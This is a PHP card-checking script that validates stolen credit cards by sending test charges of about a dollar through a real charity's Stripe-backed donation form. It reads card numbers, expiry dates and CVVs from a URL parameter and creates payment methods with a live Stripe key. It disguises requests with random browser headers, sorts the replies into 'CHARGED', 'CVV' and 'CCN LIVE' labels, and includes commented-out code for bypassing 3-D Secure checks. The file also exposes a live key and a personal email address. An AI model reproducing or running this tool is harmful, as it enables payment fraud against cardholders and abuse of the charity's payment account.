<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);

###################################[Proxy]#####################


// ###########################[Get - Req]#################
  $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_methods',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://checkout.stripe.com',
               'referer: https://checkout.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Mike+smth&billing_details[address][line1]=123+Allen+Street&billing_details[address][city]=New+York&billing_details[address][state]=new+York&billing_details[address][postal_code]=10080&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cb2f69db-9cb9-4998-9561-75d6ef7d70a5202289&muid=a67e741e-5416-4023-a150-39faa629f531144a47&sid=d73033d1-f2ec-4511-9b2d-8d3e7943d7f44a06fe&pasted_fields=number&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730&time_on_page=114599&key=pk_live_517N6dIJqdlaUy8eQ73HNNWgobqp65NuUxgVEoViAkBhBxW3Ascrb32xX76hvVqlMGvcrSwr84M9dFeGmFYfObPj600oiy973yy');
        
        $r1 = curl_exec($ch);
 
        $id = Getstr($r1,'"id": "','"');
        $brand = Getstr($r1,'"brand": "','"');
 $last4 = Getstr($r1,'"last4": "','"');
 $supported = Getstr($r1,'"supported": ',' }');
 $created = Getstr($r1,'"created": ',',');
 $funding = Getstr($r1,'"funding": "','"');
 $exp_year = Getstr($r1,'"exp_year": ',',');
 $exp_month = Getstr($r1,'"exp_month": ',',');
 $country = Getstr($r1,'"country": "','"');


// echo "<b>Result1=</b>$r1<br><br>";
// echo "<b>id=</b>$id<br><br>";
// echo "<b>brand=</b>$brand<br><br>";
// echo "<b>last4=</b>$last4<br><br>";
// echo "<b>supported=</b>$supported<br><br>";
// echo "<b>created=</b>$created<br><br>";
// echo "<b>funding=</b>$funding<br><br>";
// echo "<b>exp_year=</b>$exp_year<br><br>";
// echo "<b>exp_month=</b>$exp_month<br><br>";
// echo "<b>country=</b>$country<br><br>";

############################[2 Req]############################
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://gmhainc.org/wp-admin/admin-ajax.php');

        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: gmhainc.org',
               'method: POST',
               'path: /wp-admin/admin-ajax.php',
               'scheme: https',
               'accept: application/json, text/javascript, */*; q=0.01',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
              'cookie: __stripe_mid=a67e741e-5416-4023-a150-39faa629f531144a47; __stripe_sid=d73033d1-f2ec-4511-9b2d-8d3e7943d7f44a06fe',
               'origin: https://gmhainc.org',
               'referer: https://gmhainc.org/annual-fund-support-gmha/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_create_payment_intent&nonce=de47c76eb3&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=New+York&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D='.$country.'&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=123+Allen+Street&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=10080&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=new+York&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=Mike+smth&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D='.$brand.'&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D='.$country.'&payment_method%5Bcard%5D%5Bexp_month%5D='.$exp_month.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$exp_year.'&payment_method%5Bcard%5D%5Bfunding%5D='.$funding.'&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$last4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D='.$brand.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D='.$supported.'&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$created.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=103&feed_id=13');
        
        $r2 = curl_exec($ch);
$data = Getstr($r2,'data":','}}');
echo $data;
#################################[again to make it]#################

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://gmhainc.org/annual-fund-support-gmha/');

        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: gmhainc.org',
               'method: POST',
               'path: /annual-fund-support-gmha/',
               'scheme: https',
               'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'accept-language: en-US,en;q=0.9',
               'content-type: multipart/form-data; boundary=----WebKitFormBoundaryRGHj167jrHjVTHp4',
          'cookie: __stripe_mid=a67e741e-5416-4023-a150-39faa629f531144a47; __stripe_sid=d73033d1-f2ec-4511-9b2d-8d3e7943d7f44a06fe',
               'origin: https://gmhainc.org',
               'referer: https://gmhainc.org/annual-fund-support-gmha/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_1.3"

Mike
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_1.6"

smith
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_2.1"

123 Allen Street
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_2.2"


------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_2.3"

New York
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_2.4"

new York
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_2.5"

10080
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_2.6"

United States
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_3"

(767) 654-5552
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_4"

yadavsahil1836@gmail.com
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_5"

$1.00
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_8"


------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_10"

0.03
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_6"

$1.03
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_9.5"

Mike smth
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="input_11"


------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="gform_ajax"

form_id=3&title=&description=&tabindex=0
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="is_submit_3"

1
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="gform_submit"

3
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="state_3"

WyJbXSIsIjM4NDI1YjI3YTBhYTJmZDRhYWFmMzU3NDgzYWIwNmUyIl0=
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="gform_target_page_number_3"

0
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="gform_source_page_number_3"

1
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="stripe_response"

'.$data.'}
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="stripe_credit_card_last_four"

7040
------WebKitFormBoundaryRGHj167jrHjVTHp4
Content-Disposition: form-data; name="stripe_credit_card_type"

visa
------WebKitFormBoundaryRGHj167jrHjVTHp4--');
        
        $r3 = curl_exec($ch);
$result = Getstr($r3,'<span class="gform-icon gform-icon--close"></span>','</h2>');
echo $result;

// #####################[3ds Bypass using url]#############
// if (strpos($r2, "https://hooks.stripe.com/redirect/authenticate/"))   
// {
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $r4 = curl_exec($ch);
             
// }
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "three_d_secure_2_source"))   
// {
//                 $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: api.stripe.com',
//                'method: POST',
//                'path: /v1/3ds2/authenticate',
//                'scheme: https',
//                'accept: application/json',
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                'origin: https://js.stripe.com',
//                'referer: https://js.stripe.com/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
//                'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk');
        
//         $srcresult = curl_exec($ch);
      
//   }



########################[Responses]############################
///// [2REQ - RSOP]

if(strpos($r2,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

// elseif(strpos($result31,'Membership Confirmation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your support')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your donation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'/wishlist-member/?reg=')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'Thank You')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, '\"success\":true')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'pass')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'wcf-key')) {
//  $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';

  
// }

elseif(strpos($r2, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, '\"cvc_check\": \"pass\"')) {
  $status = '#CVV';
  $cc_code = '『 CVC_CHECK: PASS ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is invalid" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Security code is incorrect" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected Form Ur cards 』';
  $reqfind = '2 Req';
}




//=======================[Responses-END]==============================//


    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.''.$bindata1.'</br>';   
echo "<b>Last result=</b>$r2<br><br>";
    
   
?> 